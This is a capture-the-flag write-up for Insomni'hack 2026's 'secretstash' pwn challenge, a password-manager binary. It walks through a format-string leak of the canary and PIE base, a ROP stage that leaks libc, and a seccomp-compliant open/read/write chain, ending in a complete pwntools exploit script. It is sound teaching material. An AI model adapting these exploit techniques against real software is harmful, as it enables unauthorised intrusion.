---
title: Insomni'hack 2026 - secretstash
date: 2026-03-24 00:48:00
tags: 
- buffer overflow
- seccomp bypass
- orw
category: 
- ctf
- pwn
---

## Introduction

This is a buffer overflow challenge from Insomni'hack 2026.

## TLDR
- Format string → leak canary + PIE
- Stack overflow → ROP → ORW

## Challenge Overview

The challenge exposes a password manager-like interface:
- login system
- entry creation (site / username / password / description)
- menu loop

At first glance, the interesting part is inside the entry creation, which is vulnerable to a stack overflow inside the description field.

```c
...
00001ad7          char username[0x40]
00001ad7          memset(&username, 0, 0xc0)
00001ae8          printf(format: "Enter site/app name: ")
00001ae8
00001b06          if (read_userinput(&username, 0x40) == 1)
00001b28              printf(format: "Enter username/email: ")
00001b4a              char password[0x40]
00001b4a              
00001b4a              if (read_userinput(&password, 0x40) == 1)
00001b6c                  printf(format: "Enter password: ")
00001b8e                  char description[0x40]
00001b8e                  
00001b8e                  if (read_userinput(&description, 0x40) == 1)
00001bb0                      printf(format: "Enter description: ")
00001bc6                      char buf[0x38]
00001bc6                      read(fd: 0, &buf, nbytes: 0x100)
00001c0b                      fprintf(stream: fp, format: "%s|%s|%s|%s\n", &username, &password, &description, &buf)
00001c1a                      fclose(fp: fp)
00001c26                      puts(str: "Entry saved successfully.")
00001b8e                  else
00001b9a                      fclose(fp: fp)
00001b4a              else
00001b56                  fclose(fp: fp)
00001b06          else
00001b12              fclose(fp: fp)
...
```


However, due to mitigations, exploitation is not trivial.

### Protections
```zsh
Canary          : Enabled
NX              : Enabled
PIE             : Enabled
RELRO           : Full RELRO
Fortify         : Not found
```

### Seccomp filtering
```c
00001521  int64_t init_seccomp()

0000152d      void* fsbase
0000152d      int64_t rax = *(fsbase + 0x28)
00001541      int64_t ctx = seccomp_init(0)
00001541      
0000154f      if (ctx == 0)
0000156c          fwrite(buf: "seccomp_init failed\n", size: 1, count: 0x14, fp: stderr)
00001576          exit(status: 1)
00001576          noreturn
00001576      
00001587      seccomp_rule_add(ctx, 0x7fff0000, READ, 0) 
00001598      seccomp_rule_add(ctx, 0x7fff0000, WRITE, 0)
000015a9      seccomp_rule_add(ctx, 0x7fff0000, OPEN, 0)
000015ba      seccomp_rule_add(ctx, 0x7fff0000, OPENAT, 0)
000015cb      seccomp_rule_add(ctx, 0x7fff0000, CLOSE, 0)
000015dc      seccomp_rule_add(ctx, 0x7fff0000, EXIT, 0)
000015ed      seccomp_rule_add(ctx, 0x7fff0000, EXIT_GROUP, 0)
000015fe      seccomp_rule_add(ctx, 0x7fff0000, NEWFSTATAT, 0)
0000160f      seccomp_rule_add(ctx, 0x7fff0000, FSTAT, 0)
00001620      seccomp_rule_add(ctx, 0x7fff0000, LSEEK, 0)
00001631      seccomp_rule_add(ctx, 0x7fff0000, BRK, 0)
00001642      seccomp_rule_add(ctx, 0x7fff0000, MMAP, 0)
00001653      seccomp_rule_add(ctx, 0x7fff0000, MUNMAP, 0)
00001653      
00001666      if (seccomp_load(ctx) != 0)
0000166f          seccomp_release(ctx)
0000168f          fwrite(buf: "seccomp_load failed\n", size: 1, count: 0x14, fp: stderr)
00001699          exit(status: 1)
00001699          noreturn
00001699      
000016a5      seccomp_release(ctx)
000016af      int64_t result = rax ^ *(fsbase + 0x28)
000016af      
000016b8      if (result == 0)
000016c0          return result
```


## Authentication — Format String Bug

### Vulnerability

During the login process, the username is passed directly to a printf-like function without a format specifier, allowing us to leak arbitrary data.
```c
0000191e      if (account != 0)
00001933          printf(format: "\nCheck ")
00001948          printf(format: &account->username)
00001954          puts(str: " account")
00001975          result = strcmp(&account->password, admin_pwd) == 0
0000191e      else
00001920          result = 0
```

### Exploit primitive

By injecting `%9$p|%11$p` as the username, we can leak both the stack canary and a return address from the stack.

```py
def login_and_leak(p):
    p.sendlineafter(b"username: ", "%9$p|%11$p".encode())
    p.sendlineafter(b"password: ", b"admin")

    p.recvuntil(b"Check ")
    leaks = p.recvuntil(b" account").decode()
    canary_s, pie_s = leaks.split("|")

    canary = int(canary_s, 16)
    pie = int(pie_s, 16) - 0x1a5a

    log.success(f"canary = {hex(canary)}")
    log.success(f"pie    = {hex(pie)}")
    return canary, pie
```


## Libc leak via ROP

At this point, the next logical step is to build a ROP chain. However, a quick inspection of the binary reveals that it does not contain enough gadgets to construct our exploit. In particular, we are missing primitives to invoke syscalls.

As a result, we shift our focus to the libc. We craft a first-stage payload to leak the address of `read` from the GOT.
```py
def build_stage1(canary, pie):
    payload  = b"A" * 56 
    payload += p64(canary)
    payload += b"A" * 8
    payload += p64(pie + POP_RDI_OFF)
    payload += p64(pie + READ_GOT_OFF)
    payload += p64(pie + PUTS_PLT_OFF)
    payload += p64(pie + MENU_OFF)
    return payload
```

Since the GOT entry contains the resolved libc address of read, this gives us a reliable libc leak. Once we receive this value, computing the libc base is straightforward:

```py
libc = ELF("./libc-2.31.so", checksec=False)
libc.address = read_leak - libc.sym["read"]
```


## ORW (Open / Read / Write)
At this point, we have everything we need. But with seccomp in place, we cannot spawn a shell because syscalls like `execve` are not allowed. This naturally leads to the classic ORW strategy: instead of getting a shell, we will directly read the flag file from disk.



## Final Exploit

```py
#!/usr/bin/env python3
from pwn import *
import time

HOST = "secretstash.insomnihack.ch"
PORT = 6666

context.binary = elf = ELF("./secretstash_patched", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

context.arch = "amd64"
context.log_level = "info"

OFFSET_CANARY = 56

FMT_CANARY_IDX = 9
FMT_PIE_IDX    = 11
PIE_LEAK_OFF   = 0x1a5a

POP_RDI_OFF  = 0x21d3
RET_OFF      = 0x21e4
PUTS_PLT_OFF = 0x11e0
READ_GOT_OFF = elf.got["read"]
MENU_OFF     = 0x1ff0


def start():
    if args.LOCAL:
        return process(["./secretstash_patched"])
    return remote(HOST, PORT)


def login_and_leak(p):
    fmt = f"%{FMT_CANARY_IDX}$p|%{FMT_PIE_IDX}$p".encode()

    p.sendlineafter(b"username: ", fmt)
    p.sendlineafter(b"password: ", b"admin")

    p.recvuntil(b"Check ")
    leaks = p.recvuntil(b" account", drop=True).decode()
    canary_s, pie_s = leaks.split("|")

    canary = int(canary_s, 16)
    pie = int(pie_s, 16) - PIE_LEAK_OFF

    log.success(f"canary = {hex(canary)}")
    log.success(f"pie    = {hex(pie)}")
    return canary, pie


def build_stage1(canary, pie):
    payload  = b"A" * OFFSET_CANARY
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(pie + POP_RDI_OFF)
    payload += p64(pie + READ_GOT_OFF)
    payload += p64(pie + PUTS_PLT_OFF)
    payload += p64(pie + MENU_OFF)
    return payload


def recv_libc_leak(p):
    data = p.recvuntil(b"\x7f", timeout=3)
    if not data:
        raise EOFError("libc leak not found")

    leak = u64(data[-6:].ljust(8, b"\x00"))
    log.success(f"read@libc = {hex(leak)}")
    return leak


def build_stage2(canary, pie):
    POP_RAX      = libc.address + 0x36174
    POP_RDI      = libc.address + 0x23b6a
    POP_RSI      = libc.address + 0x2601f
    POP_RDX_RBX  = libc.address + 0x15fae6
    SYSCALL      = libc.address + 0x630a9
    XCHG_EDI_EAX = libc.address + 0x14f671   

    RET = pie + RET_OFF

    path_addr = pie + elf.bss() + 0x800
    buf_addr  = pie + elf.bss() + 0x900

    payload  = b"A" * OFFSET_CANARY
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(RET)

    # read(0, path_addr, 0x40)
    payload += p64(POP_RAX)
    payload += p64(0)                  
    payload += p64(POP_RDI)
    payload += p64(0)
    payload += p64(POP_RSI)
    payload += p64(path_addr)
    payload += p64(POP_RDX_RBX)
    payload += p64(0x40)
    payload += p64(0)
    payload += p64(SYSCALL)

    # open(path_addr, 0, 0)
    payload += p64(POP_RAX)
    payload += p64(2)                  
    payload += p64(POP_RDI)
    payload += p64(path_addr)
    payload += p64(POP_RSI)
    payload += p64(0)
    payload += p64(POP_RDX_RBX)
    payload += p64(0)
    payload += p64(0)
    payload += p64(SYSCALL)

    # eax -> edi (fd)
    payload += p64(XCHG_EDI_EAX)

    # read(fd, buf_addr, 0x100)
    payload += p64(POP_RAX)
    payload += p64(0)                  
    payload += p64(POP_RSI)
    payload += p64(buf_addr)
    payload += p64(POP_RDX_RBX)
    payload += p64(0x100)
    payload += p64(0)
    payload += p64(SYSCALL)

    # write(1, buf_addr, 0x100)
    payload += p64(POP_RAX)
    payload += p64(1)                 
    payload += p64(POP_RDI)
    payload += p64(1)
    payload += p64(POP_RSI)
    payload += p64(buf_addr)
    payload += p64(POP_RDX_RBX)
    payload += p64(0x100)
    payload += p64(0)
    payload += p64(SYSCALL)

    return payload


def add_entry(p, payload):
    p.sendlineafter(b"Choose an option: ", b"1")
    p.sendlineafter(b"Enter site/app name: ", b"insomni'hack")
    p.sendlineafter(b"Enter username/email: ", b"0xM4t")
    p.sendlineafter(b"Enter password: ", b"w00tw00t")
    p.sendafter(b"Enter description: ", payload)


def main():
    p = start()

    canary, pie = login_and_leak(p)

    # Stage 1: leak libc
    add_entry(p, build_stage1(canary, pie))
    read_leak = recv_libc_leak(p)
    libc.address = read_leak - libc.sym["read"]
    log.success(f"libc base = {hex(libc.address)}")

    # Stage 2: ORW
    payload = build_stage2(canary, pie)
    add_entry(p, payload)

    # Stage 3: read flag
    p.send(b"flag\x00".ljust(0x40, b"\x00"))

    p.interactive()


if __name__ == "__main__":
    main()
```
